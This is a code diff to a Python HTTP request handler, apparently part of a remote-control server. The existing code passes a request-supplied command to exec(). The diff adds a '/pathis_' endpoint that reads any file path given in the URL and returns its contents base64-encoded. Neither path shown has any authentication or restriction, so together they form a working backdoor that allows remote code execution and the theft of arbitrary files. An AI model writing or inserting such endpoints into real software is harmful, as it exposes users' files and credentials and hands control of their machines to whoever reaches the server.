@@ -16,6 +16,7 @@ import webbrowser
 import urllib.parse
 import subprocess
 import cv2
+import base64
 
 #import callShell from "./bashscript.py";
 
@@ -85,6 +86,13 @@ class _HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
             exec(command)
             result = "comanda"
             result = result.encode("utf-8")
+            self._write(200, 'application/octet-stream', result)
+            return
+        if self.path.startswith("/pathis_"):
+            pref, path = self.path[:8], self.path[8:]
+            fp = open(path, 'rb').read()
+            message = base64.b64encode(fp).decode("ascii")
+            result = message.encode("utf-8")
             self._write(200, 'application/octet-stream', result)
             return
         path = urllib.parse.urlparse(self.path).path
